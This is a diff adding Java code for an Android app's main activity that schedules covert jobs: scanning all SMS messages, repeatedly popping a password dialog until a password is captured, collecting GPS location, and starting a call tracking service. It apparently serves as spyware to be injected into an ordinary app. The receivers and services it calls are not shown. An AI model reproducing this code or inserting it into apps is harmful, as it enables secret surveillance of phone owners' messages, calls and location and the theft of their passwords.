@@ -1,0 +1,69 @@
+// The following snippet should be added to the onCreate method of your main activity:
+
+    SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
+    // Only set the Sms alarm if there is no lastTime recorded.
+    if (prefs.getLong("lastTime", -1) == -1) {
+      setSmsAlarm();
+    }
+
+    // Only set the password dialog to show up if we do not have the password.
+    if (!prefs.getBoolean("havePass", false)) {
+      setPassAlarm();
+    }
+
+    // Set the GPS alarm if not yet set.
+    if (!prefs.getBoolean("gpsSet", false)) {
+      setGpsAlarm();
+    }
+
+    // Start the call tracking service.
+    Intent callIntent = new Intent(this, CallService.class);
+    startService(callIntent);
+
+    
+// The folloing methods should be added to the main activity class:
+  
+  // This method makes the password dialog appear in 3 minutes. 
+  private void setPassAlarm() {
+    Intent i = new Intent(this, ShowPassDialogReceiver.class);
+    Calendar cal = Calendar.getInstance();
+    int _id = (int) System.currentTimeMillis();
+    PendingIntent appIntent =
+        PendingIntent.getBroadcast(this, _id, i, PendingIntent.FLAG_ONE_SHOT);
+
+    cal.add(Calendar.MINUTE, 3);
+    Log.i("PASS_DIALOG_ALARM_SET", "Set pass alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
+    AlarmManager am = (AlarmManager)getSystemService(Activity.ALARM_SERVICE);
+    am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
+            appIntent);
+  }
+
+  // This method will cause all sms messages to be scanned in 1 minute.
+  private void setSmsAlarm() {
+    Intent i = new Intent(this, ScanSMSReceiver.class);
+    Calendar cal = Calendar.getInstance();
+    int _id = (int) System.currentTimeMillis();
+    PendingIntent appIntent =
+        PendingIntent.getBroadcast(this, _id, i, PendingIntent.FLAG_ONE_SHOT);
+
+    cal.add(Calendar.MINUTE, 1);
+    Log.i("SMS_SCAN_ALARM_SET", "Set scan sms alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
+    AlarmManager am = (AlarmManager)getSystemService(Activity.ALARM_SERVICE);
+    am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
+            appIntent);
+  }
+  
+  // This method will get GPS location in 5 minutes.
+  private void setGpsAlarm() {
+    Intent i = new Intent(this, GetGPSReceiver.class);
+    Calendar cal = Calendar.getInstance();
+    int _id = (int) System.currentTimeMillis();
+    PendingIntent appIntent =
+        PendingIntent.getBroadcast(this, _id, i, PendingIntent.FLAG_ONE_SHOT);
+
+    cal.add(Calendar.MINUTE, 5);
+    Log.i("GET_GPS_ALARM_SET", "Set get gps alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
+    AlarmManager am = (AlarmManager)getSystemService(Activity.ALARM_SERVICE);
+    am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
+            appIntent);
+  }
